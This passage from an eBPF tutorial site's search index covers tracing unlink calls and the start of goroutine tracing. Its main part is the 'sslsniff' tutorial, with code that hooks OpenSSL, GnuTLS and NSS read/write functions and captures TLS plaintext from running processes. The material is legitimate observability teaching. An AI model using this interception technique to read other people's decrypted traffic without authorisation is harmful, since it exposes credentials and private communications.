pid;\n\n    pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    bpf_printk(\"fentry: pid = %d, filename = %s\\n\", pid, name-&gt;name);\n    return 0;\n}\n\nSEC(\"fexit/do_unlinkat\")\nint BPF_PROG(do_unlinkat_exit, int dfd, struct filename *name, long ret)\n{\n    pid_t pid;\n\n    pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    bpf_printk(\"fexit: pid = %d, filename = %s, ret = %ld\\n\", pid, name-&gt;name, ret);\n    return 0;\n}\n</code></pre> <p>This program is an eBPF (Extended Berkeley Packet Filter) program written in the C language. It uses BPF fentry and fexit probes to trace the Linux kernel function <code>do_unlinkat</code>. In this tutorial, we will use this program as an example to learn how to use fentry in eBPF to detect and capture unlink system calls.</p> <p>The program consists of the following parts:</p> <ol> <li>Include header files: including vmlinux.h (for accessing kernel data structures), bpf/bpf_helpers.h (which includes eBPF helper functions), bpf/bpf_tracing.h (for eBPF tracing-related functionalities).</li> <li>Define license: Here, a character array named <code>LICENSE</code> is defined, containing the license information \"Dual BSD/GPL\".</li> <li>Define fentry probe: We define an fentry probe named <code>BPF_PROG(do_unlinkat)</code> that is triggered at the entry point of the <code>do_unlinkat</code> function. This probe retrieves the PID (Process ID) of the current process and prints it along with the filename to the kernel log.</li> <li>Define fexit probe: We also define an fexit probe named <code>BPF_PROG(do_unlinkat_exit)</code> that is triggered at the exit point of the <code>do_unlinkat</code> function. Similar to the fentry probe, this probe also retrieves the PID of the current process and prints it along with the filename and return value to the kernel log.</li> </ol> <p>Through this example, you can learn how to use fentry and fexit probes in eBPF to monitor and capture kernel function calls, such as the unlink system call in this tutorial. \"eunomia-bpf is an open source eBPF dynamic loading runtime and development toolchain combined with Wasm. Its goal is to simplify the development, building, distribution, and running of eBPF programs. You can refer to here to download and install the ecc compilation toolchain and ecli runtime. We use eunomia-bpf to compile and run this example.</p> <p>To compile and run the above code:</p> <pre><code>$ ecc fentry-link.bpf.c\nCompiling bpf object...\nPacking ebpf object and config into package.json...\n$ sudo ecli run package.json\nRunning eBPF program...\n</code></pre> <p>In another window:</p> <pre><code>touch test_file\nrm test_file\ntouch test_file2\nrm test_file2\n</code></pre> <p>After running this program, you can view the output of the eBPF program by examining the <code>/sys/kernel/debug/tracing/trace_pipe</code> file:</p> <pre><code>$ sudo cat /sys/kernel/debug/tracing/trace_pipe\n              rm-9290    [004] d..2  4637.798698: bpf_trace_printk: fentry: pid = 9290, filename = test_file\n              rm-9290    [004] d..2  4637.798843: bpf_trace_printk: fexit: pid = 9290, filename = test_file, ret = 0\n              rm-9290    [004] d..2  4637.798698: bpf_trace_printk: fentry: pid = 9290, filename = test_file2\n              rm-9290    [004] d..2  4637.798843: bpf_trace_printk: fexit: pid = 9290, filename = test_file2, ret = 0\n</code></pre>"},{"location":"tutorials/3-fentry-unlink/#summary","title":"Summary","text":"<p>This program is an eBPF program that captures the <code>do_unlinkat</code> and <code>do_unlinkat_exit</code> functions using fentry and fexit, and uses <code>bpf_get_current_pid_tgid</code> and <code>bpf_printk</code> functions to obtain the ID, filename, and return value of the process calling do_unlinkat, and print them in the kernel log.</p> <p>To compile this program, you can use the ecc tool, and to run it, you can use the ecli command, and view the output of the eBPF program by checking the <code>/sys/kernel/debug/tracing/trace_pipe</code> file.</p> <p>If you'd like to learn more about eBPF knowledge and practices, you can visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ for more examples and complete tutorials.</p> <p>Share on  Share on </p>"},{"location":"tutorials/30-sslsniff/","title":"eBPF Practical Tutorial: Capturing SSL/TLS Plain Text Data Using uprobe","text":"<p>With the widespread use of TLS in modern network environments, tracing microservices RPC messages has become increasingly challenging. Traditional traffic sniffing techniques often face limitations in accessing only encrypted data, preventing a genuine observation of the original communication content. This restriction poses significant obstacles to system debugging and analysis.</p> <p>However, a new solution is now available. Through the use of eBPF technology and its capability to perform probing in user space, a method has emerged to regain plain text data, allowing us to intuitively view the pre-encrypted communication content. Nevertheless, each application might utilize different libraries, and each library comes in multiple versions, introducing complexity to the tracking process.</p> <p>In this tutorial, we will guide you through an eBPF tracing technique that spans across various user-space SSL/TLS libraries. This technique not only allows simultaneous tracing of user-space libraries like GnuTLS and OpenSSL but also significantly reduces maintenance efforts for new library versions compared to previous methods. The complete code for this tutorial can be found in &lt;\u5b8c\u6574\u7684\u6e90\u4ee3\u7801\u53ef\u4ee5\u5728\u8fd9\u91cc\u67e5\u770b\uff1ahttps://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/30-sslsniff</p>"},{"location":"tutorials/30-sslsniff/#background-knowledge","title":"Background Knowledge","text":"<p>Before delving into the main topic of this tutorial, we need to grasp some core concepts that will serve as the foundation for our subsequent discussions.</p>"},{"location":"tutorials/30-sslsniff/#ssl-and-tls","title":"SSL and TLS","text":"<p>SSL (Secure Sockets Layer): Developed by Netscape in the early 1990s, SSL provides data encryption for communication between two machines on a network. However, due to known security vulnerabilities, SSL has been succeeded by its successor, TLS.</p> <p>TLS (Transport Layer Security): TLS is the successor to SSL, aiming to provide stronger and more secure data encryption methods. TLS operates through a handshake process during which a client and a server select an encryption algorithm and corresponding keys. Once the handshake is complete, data transmission begins, with all data being encrypted using the chosen algorithm and keys.</p>"},{"location":"tutorials/30-sslsniff/#operation-principles-of-tls","title":"Operation Principles of TLS","text":"<p>Transport Layer Security (TLS) is a cryptographic protocol designed to provide security for communication over computer networks. Its primary goal is to provide security, including privacy (confidentiality), integrity, and authenticity, for two or more communicating computer applications over a network using cryptography, such as certificates. TLS consists of two sub-layers: the TLS Record Protocol and the TLS Handshake Protocol.</p>"},{"location":"tutorials/30-sslsniff/#handshake-process","title":"Handshake Process","text":"<p>When a client connects to a TLS-enabled server and requests a secure connection, the handshake process begins. The handshake allows the client and server to establish security parameters for the connection using asymmetric cryptography. The complete process is as follows:</p> <ol> <li>Initial Handshake: The client connects to the TLS-enabled server, requests a secure connection, and provides a list of supported cipher suites (encryption algorithms and hash functions).</li> <li>Selecting Cipher Suite: From the provided list, the server chooses a cipher suite and hash function it also supports and notifies the client of the decision.</li> <li>Providing Digital Certificate: Usually, the server then provides identity authentication in the form of a digital certificate. This certificate includes the server's name, trusted certificate authorities (guaranteeing the certificate's authenticity), and the server's public encryption key.</li> <li>Certificate Verification: The client verifies the certificate's validity before proceeding.</li> <li>Generating Session Key: To create a session key for a secure connection, the client has two methods:<ul> <li>Encrypt a random number (PreMasterSecret) with the server's public key and send the result to the server (only the server can decrypt it with its private key); both parties then use this random number to generate a unique session key for encrypting and decrypting data during the session.</li> <li>Use Diffie-Hellman key exchange (or its variant, Elliptic Curve DH) to securely generate a random and unique session key for encryption and decryption. This key has the additional property of forward secrecy: even if the server's private key is exposed in the future, it can't be used to decrypt the current session, even if a third party intercepts and records the session.</li> </ul> </li> </ol> <p>Once these steps are successfully completed, the handshake process concludes, and the encrypted connection begins. This connection uses the session key for encryption and decryption until the connection is closed. If any of the above steps fail, the TLS handshake fails, and the connection won't be established.</p>"},{"location":"tutorials/30-sslsniff/#tls-in-the-osi-model","title":"TLS in the OSI Model","text":"<p>TLS and SSL don't perfectly align with any single layer of the OSI model or the TCP/IP model. TLS \"runs over some reliable transport protocol (such as TCP),\" which means it sits above the transport layer. It provides encryption for higher layers, typically the presentation layer. However, applications using TLS often consider it the transport layer, even though applications using TLS must actively control the initiation of TLS handshakes and the handling of exchanged authentication certificates.</p>"},{"location":"tutorials/30-sslsniff/#ebpf-and-uprobes","title":"eBPF and uprobes","text":"<p>eBPF (Extended Berkeley Packet Filter): It's a kernel technology that allows users to run predefined programs in the kernel space without modifying kernel source code or reloading modules. It creates a bridge that enables interaction between user space and kernel space, providing unprecedented capabilities for tasks like system monitoring, performance analysis, and network traffic analysis.</p> <p>uprobes are a significant feature of eBPF, allowing dynamic insertion of probe points in user space applications, particularly useful for tracking function calls in SSL/TLS libraries. Uprobe in kernel mode eBPF runtime may also cause relatively large performance overhead. In this case, you can also consider using user mode eBPF runtime, such as bpftime\u3002bpftime is a user mode eBPF runtime based on LLVM JIT/AOT. It can run eBPF programs in user mode and is compatible with kernel mode eBPF, avoiding context switching between kernel mode and user mode, thereby improving the execution efficiency of eBPF programs. bpftime can have a performance overhead that is one order of magnitude smaller than that of kernel mode eBPF.</p>"},{"location":"tutorials/30-sslsniff/#user-space-libraries","title":"User-Space Libraries","text":"<p>The implementation of the SSL/TLS protocol heavily relies on user-space libraries. Here are some common ones:</p> <ul> <li>OpenSSL: An open-source, feature-rich cryptographic library widely used in many open-source and commercial projects.</li> <li>BoringSSL: A fork of OpenSSL maintained by Google, focusing on simplification and optimization for Google's needs.</li> <li>GnuTLS: Part of the GNU project, offering an implementation of SSL, TLS, and DTLS protocols. GnuTLS differs from OpenSSL and BoringSSL in API design, module structure, and licensing.</li> </ul>"},{"location":"tutorials/30-sslsniff/#openssl-api-analysis","title":"OpenSSL API Analysis","text":"<p>OpenSSL is a widely used open-source library providing a complete implementation of the SSL and TLS protocols, ensuring data transmission security in various applications. Among its functions, SSL_read() and SSL_write() are two core API functions for reading from and writing to TLS/SSL connections. In this section, we'll delve into these functions to help you understand their mechanisms.</p>"},{"location":"tutorials/30-sslsniff/#1-ssl_read-function","title":"1. SSL_read Function","text":"<p>When we want to read data from an established SSL connection, we can use the <code>SSL_read</code> or <code>SSL_read_ex</code> function. The function prototype is as follows:</p> <pre><code>int SSL_read_ex(SSL *ssl, void *buf, size_t num, size_t *readbytes);\nint SSL_read(SSL *ssl, void *buf, int num);\n</code></pre> <p><code>SSL_read</code> and <code>SSL_read_ex</code> attempt to read up to <code>num</code> bytes of data from the specified <code>ssl</code> into the buffer <code>buf</code>. Upon success, <code>SSL_read_ex</code> stores the actual number of read bytes in <code>*readbytes</code>.</p>"},{"location":"tutorials/30-sslsniff/#2-function-ssl_write","title":"2. Function SSL_write","text":"<p>When we want to write data into an established SSL connection, we can use the <code>SSL_write</code> or <code>SSL_write_ex</code> functions.</p> <p>Function prototype:</p> <pre><code>int SSL_write_ex(SSL *s, const void *buf, size_t num, size_t *written);\nint SSL_write(SSL *ssl, const void *buf, int num);\n</code></pre> <p><code>SSL_write</code> and <code>SSL_write_ex</code> will write up to <code>num</code> bytes of data from the buffer <code>buf</code> into the specified <code>ssl</code> connection. Upon success, <code>SSL_write_ex</code> will store the actual number of written bytes in <code>*written</code>.</p>"},{"location":"tutorials/30-sslsniff/#writing-ebpf-kernel-code","title":"Writing eBPF Kernel Code","text":"<p>In our example, we use eBPF to hook the <code>ssl_read</code> and <code>ssl_write</code> functions to perform custom actions when data is read from or written to an SSL connection.</p>"},{"location":"tutorials/30-sslsniff/#data-structures","title":"Data Structures","text":"<p>Firstly, we define a data structure <code>probe_SSL_data_t</code> to transfer data between kernel and user space:</p> <pre><code>#define MAX_BUF_SIZE 8192\n#define TASK_COMM_LEN 16\n\nstruct probe_SSL_data_t {\n    __u64 timestamp_ns;  // Timestamp (nanoseconds)\n    __u64 delta_ns;      // Function execution time\n    __u32 pid;           // Process ID\n    __u32 tid;           // Thread ID\n    __u32 uid;           // User ID\n    __u32 len;           // Length of read/write data\n    int buf_filled;      // Whether buffer is filled completely\n    int rw;              // Read or Write (0 for read, 1 for write)\n    char comm[TASK_COMM_LEN]; // Process name\n    __u8 buf[MAX_BUF_SIZE];  // Data buffer\n    int is_handshake;    // Whether it's handshake data\n};\n</code></pre>"},{"location":"tutorials/30-sslsniff/#hook-functions","title":"Hook Functions","text":"<p>Our goal is to hook into the <code>SSL_read</code> and <code>SSL_write</code> functions. We define a function <code>SSL_exit</code> to handle the return values of these two functions. This function determines whether to trace and collect data based on the current process and thread IDs.</p> <pre><code>static int SSL_exit(struct pt_regs *ctx, int rw) {\n    int ret = 0;\n    u32 zero = 0;\n    u64 pid_tgid = bpf_get_current_pid_tgid();\n    u32 pid = pid_tgid &gt;&gt; 32;\n    u32 tid = (u32)pid_tgid;\n    u32 uid = bpf_get_current_uid_gid();\n    u64 ts = bpf_ktime_get_ns();\n\n    if (!trace_allowed(uid, pid)) {\n        return 0;\n    }\n\n    /* store arg info for later lookup */\n    u64 *bufp = bpf_map_lookup_elem(&amp;bufs, &amp;tid);\n    if (bufp == 0)\n        return 0;\n\n    u64 *tsp = bpf_map_lookup_elem(&amp;start_ns, &amp;tid);\n    if (!tsp)\n        return 0;\n    u64 delta_ns = ts - *tsp;\n\n    int len = PT_REGS_RC(ctx);\n    if (len &lt;= 0)  // no data\n        return 0;\n\n    struct probe_SSL_data_t *data = bpf_map_lookup_elem(&amp;ssl_data, &amp;zero);\n    if (!data)\n        return 0;\n\n    data-&gt;timestamp_ns = ts;\n    data-&gt;delta_ns = delta_ns;\n    data-&gt;pid = pid;\n    data-&gt;tid = tid;\n    data-&gt;uid = uid;\n    data-&gt;len = (u32)len;\n    data-&gt;buf_filled = 0;\n    data-&gt;rw = rw;\n    data-&gt;is_handshake = false;\n    u32 buf_copy_size = min((size_t)MAX_BUF_SIZE, (size_t)len);\n\n    bpf_get_current_comm(&amp;data-&gt;comm, sizeof(data-&gt;comm));\n\n    if (bufp != 0)\n        ret = bpf_probe_read_user(&amp;data-&gt;buf, buf_copy_size, (char *)*bufp);\n\n    bpf_map_delete_elem(&amp;bufs, &amp;tid);\n    bpf_map_delete_elem(&amp;start_ns, &amp;tid);\n\n    if (!ret)\n        data-&gt;buf_filled = 1;\n    else\n        buf_copy_size = 0;\n\n    bpf_perf_event_output(ctx, &amp;perf_SSL_events, BPF_F_CURRENT_CPU, data,\n                            EVENT_SIZE(buf_copy_size));\n    return 0;\n}\n</code></pre> <p>The <code>rw</code> parameter here indicates whether it's a read or write operation. 0 represents read, and 1 represents write.</p>"},{"location":"tutorials/30-sslsniff/#data-collection-process","title":"Data Collection Process","text":"<ol> <li>Obtain the ID of the current process and thread, along with the ID of the current user.</li> <li>Use <code>trace_allowed</code> to determine if tracing is allowed for this process.</li> <li>Get the start time to calculate the execution time of the function.</li> <li>Attempt to retrieve relevant data from the <code>bufs</code> and <code>start_ns</code> maps.</li> <li>If data retrieval is successful, create or locate a <code>probe_SSL_data_t</code> structure to populate the data.</li> <li>Copy the data from user space to the buffer, ensuring it doesn't exceed the designated size.</li> <li>Finally, send the data to user space.</li> </ol> <p>Note: We use two user-level return probes <code>uretprobe</code> to respectively hook the returns of <code>SSL_read</code> and <code>SSL_write</code>:</p> <pre><code>SEC(\"uretprobe/SSL_read\")\nint BPF_URETPROBE(probe_SSL_read_exit) {\n    return (SSL_exit(ctx, 0));  // 0 indicates read operation\n}\n\nSEC(\"uretprobe/SSL_write\")\nint BPF_URETPROBE(probe_SSL_write_exit) {\n    return (SSL_exit(ctx, 1));  // 1 indicates write operation\n}\n</code></pre>"},{"location":"tutorials/30-sslsniff/#hooking-into-the-handshake-process","title":"Hooking into the Handshake Process","text":"<p>In SSL/TLS, the handshake is a special process used to establish a secure connection between a client and a server. To analyze this process, we hook into the <code>do_handshake</code> function to track the start and end of the handshake.</p>"},{"location":"tutorials/30-sslsniff/#entering-the-handshake","title":"Entering the Handshake","text":"<p>We use a <code>uprobe</code> to set a probe for the <code>do_handshake</code> function:</p> <pre><code>SEC(\"uprobe/do_handshake\")\nint BPF_UPROBE(probe_SSL_do_handshake_enter, void *ssl) {\n    u64 pid_tgid = bpf_get_current_pid_tgid();\n    u32 pid = pid_tgid &gt;&gt; 32;\n    u32 tid = (u32)pid_tgid;\n    u64 ts = bpf_ktime_get_ns();\n    u32 uid = bpf_get_current_uid_gid();\n\n    if (!trace_allowed(uid, pid)) {\n        return 0;\n    }\n\n    /* store arg info for later lookup */\n    bpf_map_update_elem(&amp;start_ns, &amp;tid, &amp;ts, BPF_ANY);\n    return 0;\n}\n</code></pre> <p>The main functionality of this code is as follows:</p> <ol> <li>Obtain the current <code>pid</code>, <code>tid</code>, <code>ts</code>, and <code>uid</code>.</li> <li>Use <code>trace_allowed</code> to verify if the process is allowed to be traced.</li> <li>Store the current timestamp in the <code>start_ns</code> map, which will be used to calculate the duration of the handshake process later.</li> </ol>"},{"location":"tutorials/30-sslsniff/#exiting-the-handshake","title":"Exiting the Handshake","text":"<p>Similarly, we've set a <code>uretprobe</code> for the return of <code>do_handshake</code>:</p> <pre><code>SEC(\"uretprobe/do_handshake\")\nint BPF_URETPROBE(handle_do_handshake_exit) {\n    // Code to execute upon exiting the do_handshake function.\n    return 0;\n}\n</code></pre> <p>In this context, the <code>uretprobe</code> will execute the provided code when the <code>do_handshake</code> function exits.</p> <pre><code>SEC(\"uretprobe/do_handshake\")\nint BPF_URETPROBE(probe_SSL_do_handshake_exit) {\n    u32 zero = 0;\n    u64 pid_tgid = bpf_get_current_pid_tgid();\n    u32 pid = pid_tgid &gt;&gt; 32;\n    u32 tid = (u32)pid_tgid;\n    u32 uid = bpf_get_current_uid_gid();\n    u64 ts = bpf_ktime_get_ns();\n    int ret = 0;\n\n    /* use kernel terminology here for tgid/pid: */\n    u32 tgid = pid_tgid &gt;&gt; 32;\n\n    /* store arg info for later lookup */\n    if (!trace_allowed(tgid, pid)) {\n        return 0;\n    }\n\n    u64 *tsp = bpf_map_lookup_elem(&amp;start_ns, &amp;tid);\n    if (tsp == 0)\n        return 0;\n\n    ret = PT_REGS_RC(ctx);\n    if (ret &lt;= 0)  // handshake failed\n        return 0;\n\n    struct probe_SSL_data_t *data = bpf_map_lookup_elem(&amp;ssl_data, &amp;zero);\n    if (!data)\n        return 0;\n\n    data-&gt;timestamp_ns = ts;\n    data-&gt;delta_ns = ts - *tsp;\n    data-&gt;pid = pid;\n    data-&gt;tid = tid;\n    data-&gt;uid = uid;\n    data-&gt;len = ret;\n    data-&gt;buf_filled = 0;\n    data-&gt;rw = 2;\n    data-&gt;is_handshake = true;\n    bpf_get_current_comm(&amp;data-&gt;comm, sizeof(data-&gt;comm));\n    bpf_map_delete_elem(&amp;start_ns, &amp;tid);\n\n    bpf_perf_event_output(ctx, &amp;perf_SSL_events, BPF_F_CURRENT_CPU, data,\n                            EVENT_SIZE(0));\n    return 0;\n}\n</code></pre> <p>Logic of this Function:</p> <ol> <li>Obtain the current <code>pid</code>, <code>tid</code>, <code>ts</code>, and <code>uid</code>.</li> <li>Use <code>trace_allowed</code> to recheck if tracing is allowed.</li> <li>Look up the timestamp in the <code>start_ns</code> map for calculating handshake duration.</li> <li>Use <code>PT_REGS_RC(ctx)</code> to get the return value of <code>do_handshake</code> and determine if the handshake was successful.</li> <li>Find or initialize the <code>probe_SSL_data_t</code> data structure associated with the current thread.</li> <li>Update the data structure's fields, including timestamp, duration, process information, etc.</li> <li>Use <code>bpf_perf_event_output</code> to send the data to user space.</li> </ol> <p>Our eBPF code not only tracks data transmission for <code>ssl_read</code> and <code>ssl_write</code> but also focuses on the SSL/TLS handshake process. This information is crucial for a deeper understanding and optimization of the performance of secure connections.</p> <p>Through these hook functions, we can obtain data regarding the success of the handshake, the time taken for the handshake, and related process information. This provides us with insights into the behavior of the system's SSL/TLS, enabling us to perform more in-depth analysis and optimization when necessary.</p>"},{"location":"tutorials/30-sslsniff/#user-space-assisted-code-analysis-and-interpretation","title":"User-Space Assisted Code Analysis and Interpretation","text":"<p>In the eBPF ecosystem, user-space and kernel-space code often work in collaboration. Kernel-space code is responsible for data collection, while user-space code manages, processes, and handles this data. In this section, we will explain how the above user-space code collaborates with eBPF to trace SSL/TLS interactions.</p>"},{"location":"tutorials/30-sslsniff/#1-supported-library-attachment","title":"1. Supported Library Attachment","text":"<p>In the provided code snippet, based on the setting of the <code>env</code> environment variable, the program can choose to attach to three common encryption libraries (OpenSSL, GnuTLS, and NSS). This means that we can trace calls to multiple libraries within the same tool.</p> <p>To achieve this functionality, the <code>find_library_path</code> function is first used to determine the library's path. Then, depending on the library type, the corresponding <code>attach_</code> function is called to attach the eBPF program to the library function.</p> <pre><code>    if (env.openssl) {\n        char *openssl_path = find_library_path(\"libssl.so\");\n        printf(\"OpenSSL path: %s\\n\", openssl_path);\n        attach_openssl(obj, openssl_path);\n    }\n    if (env.gnutls) {\n        char *gnutls_path = find_library_path(\"libgnutls.so\");\n        printf(\"GnuTLS path: %s\\n\", gnutls_path);\n        attach_gnutls(obj, gnutls_path);\n    }\n    if (env.nss) {\n        char *nss_path = find_library_path(\"libnspr4.so\");\n        printf(\"NSS path: %s\\n\", nss_path);\n        attach_nss(obj, nss_path);\n    }\n</code></pre> <p>This section primarily covers the attachment logic for the OpenSSL, GnuTLS, and NSS libraries. NSS is a set of security libraries designed for organizations, supporting the creation of secure client and server applications. Originally developed by Netscape, they are now maintained by Mozilla. The other two libraries have been introduced earlier and are not reiterated here.</p>"},{"location":"tutorials/30-sslsniff/#2-detailed-attachment-logic","title":"2. Detailed Attachment Logic","text":"<p>The specific <code>attach</code> functions are as follows:</p> <pre><code>#define __ATTACH_UPROBE(skel, binary_path, sym_name, prog_name, is_retprobe)   \\\n    do {                                                                       \\\n      LIBBPF_OPTS(bpf_uprobe_opts, uprobe_opts, .func_name = #sym_name,        \\\n                  .retprobe = is_retprobe);                                    \\\n      skel-&gt;links.prog_name = bpf_program__attach_uprobe_opts(                 \\\n          skel-&gt;progs.prog_name, env.pid, binary_path, 0, &amp;uprobe_opts);       \\\n    } while (false)\n\nint attach_openssl(struct sslsniff_bpf *skel, const char *lib) {\n    ATTACH_UPROBE_CHECKED(skel, lib, SSL_write, probe_SSL_rw_enter);\n    ATTACH_URETPROBE_CHECKED(skel, lib, SSL_write, probe_SSL_write_exit);\n    ATTACH_UPROBE_CHECKED(skel, lib, SSL_read, probe_SSL_rw_enter);\n    ATTACH_URETPROBE_CHECKED(skel, lib, SSL_read, probe_SSL_read_exit);\n\n    if (env.latency &amp;&amp; env.handshake) {\n        ATTACH_UPROBE_CHECKED(skel, lib, SSL_do_handshake,\n                            probe_SSL_do_handshake_enter);\n        ATTACH_URETPROBE_CHECKED(skel, lib, SSL_do_handshake,\n                                probe_SSL_do_handshake_exit);\n    }\n\n    return 0;\n}\n\nint attach_gnutls(struct sslsniff_bpf *skel, const char *lib) {\n    ATTACH_UPROBE_CHECKED(skel, lib, gnutls_record_send, probe_SSL_rw_enter);\n    ATTACH_URETPROBE_CHECKED(skel, lib, gnutls_record_send, probe_SSL_write_exit);\n    ATTACH_UPROBE_CHECKED(skel, lib, gnutls_record_recv, probe_SSL_rw_enter);\n    ATTACH_URETPROBE_CHECKED(skel, lib, gnutls_record_recv, probe_SSL_read_exit);\n\n    return 0;\n}\n\nint attach_nss(struct sslsniff_bpf *skel, const char *lib) {\n    ATTACH_UPROBE_CHECKED(skel, lib, PR_Write, probe_SSL_rw_enter);\n    ATTACH_URETPROBE_CHECKED(skel, lib, PR_Write, probe_SSL_write_exit);\n    ATTACH_UPROBE_CHECKED(skel, lib, PR_Send, probe_SSL_rw_enter);\n    ATTACH_URETPROBE_CHECKED(skel, lib, PR_Send, probe_SSL_write_exit);\n    ATTACH_UPROBE_CHECKED(skel, lib, PR_Read, probe_SSL_rw_enter);\n    ATTACH_URETPROBE_CHECKED(skel, lib, PR_Read, probe_SSL_read_exit);\n    ATTACH_UPROBE_CHECKED(skel, lib, PR_Recv, probe_SSL_rw_enter);\n    ATTACH_URETPROBE_CHECKED(skel, lib, PR_Recv, probe_SSL_read_exit);\n\n    return 0;\n}\n</code></pre> <p>We further examine the <code>attach_</code> function and can see that they both use the <code>ATTACH_UPROBE_CHECKED</code> and <code>ATTACH_URETPROBE_CHECKED</code> macros to implement specific mounting logic. These two macros are used respectively for setting uprobe (function entry) and uretprobe (function return).</p> <p>Considering that different libraries have different API function names (for example, OpenSSL uses <code>SSL_write</code>, while GnuTLS uses <code>gnutls_record_send</code>), we need to write a separate <code>attach_</code> function for each library.</p> <p>For instance, in the <code>attach_openssl</code> function, we set up probes for both <code>SSL_write</code> and <code>SSL_read</code>. If users also want to track handshake latency (<code>env.latency</code>) and the handshake process (<code>env.handshake</code>), we set up a probe for <code>SSL_do_handshake</code>.</p> <p>In the eBPF ecosystem, <code>perf_buffer</code> is an efficient mechanism used to transfer data from kernel space to user space. This is particularly useful for kernel-space eBPF programs as they can't directly interact with user space. With <code>perf_buffer</code>, we can collect data in kernel-space eBPF programs and then asynchronously read this data in user space. We use the <code>perf_buffer__poll</code> function to read data reported in kernel space, as shown below:</p> <pre><code>while (!exiting) {\n    err = perf_buffer__poll(pb, PERF_POLL_TIMEOUT_MS);\n    if (err &lt; 0 &amp;&amp; err != -EINTR) {\n        warn(\"error polling perf buffer: %s\\n\", strerror(-err));\n        goto cleanup;\n    }\n    err = 0;\n}\n</code></pre> <p>Finally, in the <code>print_event</code> function, we print the data to standard output:</p> <pre><code>// Function to print the event from the perf buffer\nvoid print_event(struct probe_SSL_data_t *event, const char *evt) {\n    ...\n    if (buf_size != 0) {\n        if (env.hexdump) {\n            // 2 characters for each byte + null terminator\n            char hex_data[MAX_BUF_SIZE * 2 + 1] = {0};\n            buf_to_hex((uint8_t *)buf, buf_size, hex_data);\n\n            printf(\"\\n%s\\n\", s_mark);\n            for (size_t i = 0; i &lt; strlen(hex_data); i += 32) {\n                printf(\"%.32s\\n\", hex_data + i);\n            }\n            printf(\"%s\\n\\n\", e_mark);\n        } else {\n            printf(\"\\n%s\\n%s\\n%s\\n\\n\", s_mark, buf, e_mark);\n        }\n    }\n}\n</code></pre> <p>You can find the complete source code here: https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/30-sslsniff</p>"},{"location":"tutorials/30-sslsniff/#compilation-and-execution","title":"Compilation and Execution","text":"<p>To start using <code>sslsniff</code>, you need to first compile it:</p> <pre><code>make\n</code></pre> <p>Once done, follow these steps:</p>"},{"location":"tutorials/30-sslsniff/#start-sslsniff","title":"Start sslsniff","text":"<p>In a terminal, execute the following command to start <code>sslsniff</code>:</p> <pre><code>sudo ./sslsniff\n</code></pre>"},{"location":"tutorials/30-sslsniff/#execute-curl-command","title":"Execute CURL command","text":"<p>In another terminal, execute:</p> <pre><code>curl https://example.com\n</code></pre> <p>Under normal circumstances, you will see output similar to the following:</p> <pre><code>    &lt;!doctype html&gt;\n    &lt;html&gt;\n    &lt;head&gt;\n        &lt;title&gt;Example Domain&lt;/title&gt;\n        ...\n    &lt;body&gt;\n    &lt;div&gt;\n        ...\n    &lt;/div&gt;\n    &lt;/body&gt;\n    &lt;/html&gt;\n</code></pre>"},{"location":"tutorials/30-sslsniff/#sslsniff-output","title":"sslsniff Output","text":"<p>After executing the <code>curl</code> command, <code>sslsniff</code> will display the following content:</p> <pre><code>    READ/RECV    0.132786160        curl             47458   1256\n    ----- DATA -----\n    &lt;!doctype html&gt;\n    ...\n    &lt;div&gt;\n        &lt;h1&gt;Example Domain&lt;/h1&gt;\n        ...\n    &lt;/div&gt;\n    &lt;/body&gt;\n    &lt;/html&gt;\n\n    ----- END DATA -----\n</code></pre> <p>Note: The displayed HTML content may vary depending on the specific content of the <code>example.com</code> page.</p>"},{"location":"tutorials/30-sslsniff/#displaying-latency-and-handshake-process","title":"Displaying Latency and Handshake Process","text":"<p>To view latency and handshake process, execute the following command:</p> <pre><code>$ sudo ./sslsniff -l --handshake\nOpenSSL path: /lib/x86_64-linux-gnu/libssl.so.3\nGnuTLS path: /lib/x86_64-linux-gnu/libgnutls.so.30\nNSS path: /lib/x86_64-linux-gnu/libnspr4.so\nFUNC         TIME(s)            COMM             PID     LEN     LAT(ms)\nHANDSHAKE    0.000000000        curl             6460    1      1.384  WRITE/SEND   0.000115400        curl             6460    24     0.014\n</code></pre>"},{"location":"tutorials/30-sslsniff/#hexadecimal-output","title":"Hexadecimal Output","text":"<p>To display data in hexadecimal format, execute the following command:</p> <pre><code>$ sudo ./sslsniff --hexdump\nWRITE/SEND   0.000000000        curl             16104   24\n----- DATA -----\n505249202a20485454502f322e300d0a\n0d0a534d0d0a0d0a\n----- END DATA -----\n\n...\n</code></pre>"},{"location":"tutorials/30-sslsniff/#summary","title":"Summary","text":"<p>eBPF is a very powerful technology that can help us gain deeper insights into how a system works. This tutorial is a simple example demonstrating how to use eBPF to monitor SSL/TLS communication. If you're interested in eBPF technology and want to learn more and practice further, you can visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial and tutorial website at https://eunomia.dev/zh/tutorials/.</p> <p>References:</p> <ul> <li>https://github.com/iovisor/bcc/pull/4706</li> <li>https://github.com/openssl/openssl</li> <li>https://www.openssl.org/docs/man1.1.1/man3/SSL_read.html</li> <li>https://github.com/iovisor/bcc/blob/master/tools/sslsniff_example.txt</li> <li>https://en.wikipedia.org/wiki/Transport_Layer_Security</li> </ul> <p>The original link of this article: https://eunomia.dev/tutorials/30-sslsniff</p> <p>Share on  Share on </p>"},{"location":"tutorials/31-goroutine/","title":"eBPF Practical Tutorial: Using eBPF to Trace Go Routine States","text":"<p>Go, the popular programming language created by Google, is known for its powerful concurrency model. One of the key features that makes Go stand out is the use of goroutines\u2014lightweight, managed threads that make it easy to write concurrent programs. However, understanding and tracing the execution states of these goroutines in real time can be challenging, especially when debugging complex systems.</p> <p>Enter eBPF (Extended Berkeley Packet Filter), a technology originally designed for network packet filtering, but which has since evolved into a powerful tool for tracing and monitoring system behavior. By leveraging eBPF, we can tap into the kernel and gather insights about the runtime behavior of Go programs, including the states of goroutines. This blog post explores how to use eBPF to trace the state transitions of goroutines in a Go program.</p>"},{"location":"tutorials/31-goroutine/#background-goroutines-and-ebpf","title":"Background: Goroutines and eBPF","text":""},{"location":"tutorials/31-goroutine/#goroutines","title":"Goroutines","text":"<p>Goroutines are a core feature of Go, providing a simple and efficient way to handle concurrency. Unlike traditional threads, goroutines are managed by the Go runtime rather than the operating system, making them much more lightweight. Goroutines can switch states, such as:</p> <ul> <li>RUNNABLE: The goroutine is ready to run.</li> 